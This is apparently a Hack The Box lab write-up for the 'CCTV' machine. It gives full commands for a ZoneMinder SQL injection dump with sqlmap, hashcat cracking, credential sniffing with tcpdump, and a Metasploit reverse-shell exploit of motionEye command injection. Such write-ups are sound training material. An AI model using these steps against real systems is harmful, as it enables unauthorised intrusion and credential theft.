---
title: "HTB: CCTV"
date: 2026-04-03
draft: false
categories: ["writeup"]
tags:
  - hackthebox
  - linux
  - medium
  - zoneminder
  - sql-injection
  - password-cracking
  - tcpdump-capture
  - motioneye
  - CVE-2024-51482
  - CVE-2025-60787
description: "CCTV is a medium Linux box featuring ZoneMinder SQL injection, credential reuse through packet capture, and motionEye authenticated RCE."
summary: "CCTV is a medium Linux box featuring ZoneMinder SQL injection, credential reuse through packet capture, and motionEye authenticated RCE."
cover:
  image: "/images/htb-cctv/info-card.png"
  alt: "HTB CCTV"
  relative: false
showToc: true
TocOpen: false
---

## Box Info

CCTV is a medium Linux machine from Hack The Box. The attack chain starts with a SecureVision website running ZoneMinder 1.37.63, which is vulnerable to SQL injection (CVE-2024-51482). Dumping and cracking the database hashes gives SSH access as mark. From there, tcpdump with `cap_net_raw` capability lets me sniff credentials for sa\_mark off the wire. That account reveals an internal motionEye instance vulnerable to authenticated RCE (CVE-2025-60787), which gives a root shell.

**Kill chain**: ZoneMinder SQLi (CVE-2024-51482) → hash dump → crack mark's bcrypt → SSH as mark → tcpdump cap\_net\_raw sniff sa\_mark creds → SSH as sa\_mark → port forward motionEye 8765 → authenticated RCE (CVE-2025-60787) → root

## Recon

### nmap

Starting with a fast port sweep, then a targeted service scan on the open ports:

```console
kali@kali$ nmap -p- --min-rate 10000 10.129.244.156
...[snip]...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
...[snip]...
```

```console
kali@kali$ nmap -sCV -p 22,80 10.129.244.156
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)
|_  256 e3:9b:38:08:9a:d7:e9:d1:94:11:ff:50:80:bc:f2:59 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://cctv.htb/
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two ports. SSH and HTTP with a redirect to `cctv.htb`. I'll add that to `/etc/hosts`.

### SecureVision Website - TCP 80

The site belongs to "SecureVision", a CCTV and security solutions company.

![SecureVision homepage showing CCTV monitoring services](/images/htb-cctv/securevision-homepage.png)

Not much interesting on the static site itself. Clicking "Staff Login" in the top-right corner redirects to a ZoneMinder login panel at `/zm/`:

![ZoneMinder login panel](/images/htb-cctv/zoneminder-login.png)

Default credentials `admin:admin` work here. That's a quick win.

### ZoneMinder - TCP 80

Once logged in, the ZoneMinder dashboard is mostly empty, no cameras configured. But the version number in the top-right corner is important: **1.37.63**.

![ZoneMinder dashboard showing version 1.37.63 in the top-right corner](/images/htb-cctv/zoneminder-dashboard-version.png)

A quick search for ZoneMinder 1.37.63 vulnerabilities turns up CVE-2024-51482, a SQL injection in the event tag removal endpoint. This is a well-documented vulnerability with a [security advisory from ZoneMinder](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3).

## Shell as mark

### CVE-2024-51482 - ZoneMinder SQL Injection

CVE-2024-51482 is an authenticated SQL injection in ZoneMinder versions prior to 1.37.64. The vulnerable endpoint is `/zm/index.php?view=request&request=event&action=removetag`, where the `tid` parameter is passed directly into a SQL query without sanitization. Since I already have valid credentials (`admin:admin`), I can exploit this to dump the database.

### Exploiting the SQLi with sqlmap

I navigate to the vulnerable endpoint and intercept the request with Burp Suite:

```text
http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1
```

![Burp Suite intercepted request to the vulnerable removetag endpoint](/images/htb-cctv/burp-sqli-request.png)

I save the request to a file and feed it to sqlmap, targeting the Users table in the `zm` database:

```console
kali@kali$ sqlmap -r req.txt --batch --risk=3 --level=5 --time-sec=1 --threads=10 -D zm -T Users -C "Username,Password" --dump
...[snip]...
+------------+--------------------------------------------------------------+
| Username   | Password                                                     |
+------------+--------------------------------------------------------------+
| superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm |
| mark       | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
| admin      | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m |
+------------+--------------------------------------------------------------+
...[snip]...
```

Three bcrypt hashes. The `$2y$10$` prefix tells me these are bcrypt with a cost factor of 10, crackable, but not instant.

### Cracking the Hashes

I throw them at hashcat with rockyou:

```console
kali@kali$ hashcat hashes.txt rockyou.txt --username -m 3200
...[snip]...
mark:$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.:opensesame
...[snip]...
```

Only mark's hash cracks: `opensesame`. The superadmin and admin hashes don't fall to rockyou. That's fine, one set of creds is all I need if they reuse passwords.

### SSH as mark

Since `mark` looks like an OS-level account, I try the cracked password over SSH:

```console
kali@kali$ ssh mark@cctv.htb
mark@cctv.htb's password: opensesame
```

![SSH shell as mark showing uid=1000](/images/htb-cctv/shell-as-mark.png)

I'm in as mark.

## Shell as sa\_mark

### Enumerating Capabilities

With a shell as mark, I start looking for privilege escalation paths. `sudo -l` doesn't yield anything useful, so I check Linux capabilities:

```console
mark@cctv:~$ getcap -r / 2>/dev/null
...[snip]...
/usr/bin/tcpdump cap_net_raw=eip
...[snip]...
```

That's interesting. `tcpdump` has `cap_net_raw` set, meaning any user can capture raw network traffic. On a box themed around CCTV and surveillance, there's probably some internal service sending credentials in the clear.

### Sniffing Credentials with tcpdump

I run a capture and wait for traffic:

```console
mark@cctv:~$ /usr/bin/tcpdump -i any -nn -w /tmp/capture.pcap
```

After letting it run for a minute or two, I stop the capture and search for anything interesting:

```console
mark@cctv:~$ strings /tmp/capture.pcap | grep -iE "pass|user|login"
...[snip]...
USERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=statusG
...[snip]...
```

Credentials for `sa_mark` flying across the wire in plaintext.

![Shell as sa_mark after switching users](/images/htb-cctv/shell-as-sa-mark.png)

```console
mark@cctv:~$ su - sa_mark
Password: X1l9fx1ZjS7RZb
sa_mark@cctv:~$ cat user.txt
82ba7ae5************************
```

## Shell as root

### Discovering motionEye

As sa\_mark, I check for listening services:

```console
sa_mark@cctv:~$ ss -tlnp
...[snip]...
LISTEN   0   128   127.0.0.1:8765   0.0.0.0:*
...[snip]...
```

Port 8765 is listening on localhost only. I set up an SSH port forward to access it from my machine:

```console
mark@cctv:~$ ~C
ssh> -L 8765:127.0.0.1:8765
Forwarding port.
```

Browsing to `http://127.0.0.1:8765/` reveals a motionEye instance, a web-based UI for managing security cameras. I log in with `admin:X1l9fx1ZjS7RZb` (reusing sa\_mark's password).

The preferences panel shows **motionEye version 0.43.1b4**, running on Motion 4.7 and Ubuntu 24.04:

![motionEye preferences showing version 0.43.1b4 on Ubuntu 24.04](/images/htb-cctv/motioneye-version.png)

### Exploitation via Metasploit

Searching for exploits against this version, I find CVE-2025-60787 on [Exploit-DB](https://www.exploit-db.com/exploits/52481). The vulnerability is in the camera configuration where input like the still image filename gets passed to a shell without sanitization.

![motionEye Still Images configuration showing the command injection field](/images/htb-cctv/motioneye-rce-payload.png)

There's a Metasploit module that handles the injection cleanly:

```console
msf6 > use exploit/linux/http/motioneye_auth_rce_cve_2025_60787
msf6 exploit(...) > set password X1l9fx1ZjS7RZb
msf6 exploit(...) > set rhost 127.0.0.1
msf6 exploit(...) > set rport 8765
msf6 exploit(...) > set lhost 10.10.15.229
msf6 exploit(...) > set payload cmd/unix/reverse_bash
msf6 exploit(...) > run
```

![Root shell showing uid=0(root)](/images/htb-cctv/root-shell.png)

```console
root@cctv:~# cat root.txt
d96198e8************************
```

Box rooted.

## Credentials

| User | Password / Hash | Source |
|------|----------------|--------|
| admin | admin | ZoneMinder default login |
| superadmin | `$2y$10$cmytVWFR...` (uncracked) | ZoneMinder SQLi dump |
| mark | opensesame | Cracked from ZoneMinder bcrypt hash |
| admin | `$2y$10$t5z8uIT....` (uncracked) | ZoneMinder SQLi dump |
| sa\_mark | X1l9fx1ZjS7RZb | tcpdump packet capture |
| admin | X1l9fx1ZjS7RZb | motionEye login (password reuse) |
